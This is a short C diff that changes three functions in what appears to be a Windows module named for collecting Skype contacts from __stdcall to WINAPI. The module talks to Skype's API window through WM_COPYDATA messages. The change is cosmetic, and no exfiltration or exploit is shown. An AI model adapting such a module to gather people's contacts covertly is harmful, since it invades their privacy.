@@ -123,7 +123,7 @@ void SendRequestContacts(HWND skype_api_wnd, HWND skype_pm_wnd)
 	HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
 }
 
-DWORD __stdcall PM_ContactsDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *time_nanosec)
+DWORD WINAPI PM_ContactsDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *time_nanosec)
 {
 	WCHAR user_handle[256];
 	WCHAR user_name[256];
@@ -220,7 +220,7 @@ DWORD __stdcall PM_ContactsDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILET
 }
 
 
-DWORD __stdcall PM_ContactsStartStop(BOOL bStartFlag, BOOL bReset)
+DWORD WINAPI PM_ContactsStartStop(BOOL bStartFlag, BOOL bReset)
 {	
 	DWORD dummy;
 
@@ -257,7 +257,7 @@ DWORD __stdcall PM_ContactsStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_ContactsInit(JSONObject elem)
+DWORD WINAPI PM_ContactsInit(JSONObject elem)
 {
 	return 1;
 }
